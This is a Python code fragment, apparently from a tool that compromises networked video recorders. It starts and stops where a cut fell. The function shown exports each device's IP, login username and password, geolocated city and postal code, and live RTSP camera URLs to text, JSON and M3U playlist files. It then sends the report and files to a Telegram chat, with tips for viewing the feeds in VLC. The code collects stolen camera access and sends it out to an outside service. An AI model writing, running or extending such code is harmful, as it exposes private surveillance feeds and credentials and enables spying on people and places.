            _tf.write(f"Channels   : {_real_ch_count_txt}\n")
            _tf.write(f"Live Feeds : {_tested_ok}\n")
            _tf.write(f"Method     : {_real_source}\n")
            if _zc_txt:
                _tf.write(f"ZeroChannel: YES ({_zc_txt['source']})\n")
            _tf.write('\n')
            if _zc_txt:
                _ztag = _zc_txt.get('live', '?')
                _tf.write('★' * 70 + '\n')
                _tf.write(f"ZeroChannel — All Cameras Combined  [{_ztag}]\n")
                _tf.write(f"RTSP     : {_zc_txt['rtsp']}\n")
                _tf.write(f"Snapshot : {_zc_txt['snapshot']}\n")
                _tf.write('★' * 70 + '\n\n')
            for _ch in sorted(_channels, key=lambda x: x['num']):
                if _ch.get('zero_ch'):
                    continue   # already written above
                _live_tag = _ch.get('live', '?')
                _tf.write('─' * 70 + '\n')
                _tf.write(f"Channel  : {_ch['num']} — {_ch['name']}  [{_live_tag}]\n")
                _tf.write(f"RTSP     : {_ch['rtsp']}\n")
                _tf.write(f"Snapshot : {_ch['snapshot']}\n")
        if not silent:
            print(f"\n{C}{'═'*70}{W}")
            print(f"  {G}[✓] Saved TEXT: {_fname_base}.txt{W}")
    except Exception as _e:
        if not silent:
            print(f"  {R}[!] Could not save TEXT: {_e}{W}")

    # ── Export JSON ───────────────────────────────────────────────────────────
    try:
        _jdata = {
            'device': {'ip': nvr_ip, 'port': nvr_port, 'username': nvr_user},
            'location': {
                'full':        _geo_str,
                'country':     _geo.get('country', 'Unknown'),
                'region':      _geo.get('region', 'Unknown'),
                'city':        _geo.get('city', 'Unknown'),
                'postal_code': _geo.get('postal_code', 'Unknown'),
            },
            'timestamp':      _nvr_ts,
            'method':         _real_source,
            'zero_channel':   next((c['rtsp'] for c in _channels if c.get('zero_ch')), None),
            'total_channels': sum(1 for c in _channels if not c.get('zero_ch')),
            'tested_live':    _tested_ok,
            'channels':       sorted(_channels, key=lambda x: x['num']),
        }
        with open(os.path.join(_save_dir, f"{_fname_base}.json"), 'w', encoding='utf-8') as _jf:
            json.dump(_jdata, _jf, indent=2)
        if not silent:
            print(f"  {G}[✓] Saved JSON: {_fname_base}.json{W}")
    except Exception as _e:
        if not silent:
            print(f"  {R}[!] Could not save JSON: {_e}{W}")

    # ── Export M3U  (LIVE + AUTH channels only; FAIL channels skipped) ────────
    _m3u_channels = [_c for _c in _channels if _c.get('live', '?') != 'FAIL']
    if not _m3u_channels:
        _m3u_channels = _channels  # fallback: include all if none verified live
    try:
        with open(os.path.join(_save_dir, f"{_fname_base}.m3u"), 'w', encoding='utf-8') as _mf:
            _mf.write("#EXTM3U\n")
            _mf.write(
                f"#EXTINF:-1, NVR @ {nvr_ip}:{nvr_port} │ {nvr_user}:{nvr_pass} │ {_geo_str}\n"
            )
            for _ch in sorted(_m3u_channels, key=lambda x: x['num']):
                _live_flag = ' ✓' if _ch.get('live') == 'LIVE' else ''
                _mf.write(
                    f"#EXTINF:-1, Ch{_ch['num']} — {_ch['name']}{_live_flag} │ "
                    f"{_geo.get('city','?')}, {_geo.get('region','?')}, {_geo.get('country','?')}\n"
                )
                _mf.write(f"{_ch['rtsp']}\n")
        if not silent:
            print(f"  {G}[✓] Saved M3U: {_fname_base}.m3u{W}")
    except Exception as _e:
        if not silent:
            print(f"  {R}[!] Could not save M3U: {_e}{W}")

    # ── Telegram ──────────────────────────────────────────────────────────────
    if TELEGRAM_CONFIG.get("enabled"):
        if not silent:
            print(f"\n{Y}Sending NVR details to Telegram...{W}")
        try:
            _tg = (
                f"╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n"
                f"  NVR Channel Map Report\n"
                f"╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\n"
                f"📍 Device   : {nvr_ip}:{nvr_port}\n"
                f"👤 User     : {nvr_user}\n"
                f"📅 Date     : {_nvr_ts}\n\n"
                f"🌍 Location : {_geo_str}\n"
                f"🏙 City     : {_geo.get('city','Unknown')}\n"
                f"🗺 Region   : {_geo.get('region','Unknown')}\n"
                f"🌐 Country  : {_geo.get('country','Unknown')}\n"
                f"📮 Postal   : {_geo.get('postal_code','Unknown')}\n\n"
                f"📊 Summary:\n"
                f"  • Total Channels : {len(_channels)}\n"
                f"  • Live Feeds     : {_tested_ok}\n"
                f"  • Method         : {_channels[0]['source'] if _channels else 'None'}\n\n"
                f"📋 Channels:\n"
            )
            for _tch in sorted(_channels[:10], key=lambda x: x['num']):
                _tg += f"\n  {_tch['num']:2d}. {_tch['name']:<20}  📹 {_tch['rtsp']}"
            if len(_channels) > 10:
                _tg += f"\n  ... and {len(_channels) - 10} more"
            _tg += (
                f"\n\n🔗 Exports:\n"
                f"  • TEXT : {_fname_base}.txt\n"
                f"  • JSON : {_fname_base}.json\n"
                f"  • M3U  : {_fname_base}.m3u\n\n"
                f"💡 Tip: Paste RTSP URLs into VLC Media Player\n"
            )
            send_telegram_message(_tg)
            send_telegram_file(os.path.join(_save_dir, f"{_fname_base}.txt"),
                               f"NVR Map {nvr_ip}:{nvr_port} [{_geo.get('city','?')}, {_geo.get('country','?')}] — TEXT")
            send_telegram_file(os.path.join(_save_dir, f"{_fname_base}.json"),
                               f"NVR Map {nvr_ip}:{nvr_port} — JSON")
            send_telegram_file(os.path.join(_save_dir, f"{_fname_base}.m3u"),
                               f"NVR Map {nvr_ip}:{nvr_port} — M3U Playlist")
            if not silent:
                print(f"{G}[✓] Details sent to Telegram{W}")
        except Exception as _tge:
            if not silent:
                print(f"{R}[!] Telegram send failed: {_tge}{W}")

    if not silent:
        print(f"  {Y}Tip: paste any RTSP URL into VLC → Media → Open Network Stream{W}")
        print(f"{C}{'═'*70}{W}")

    return len(_channels), _fname_base


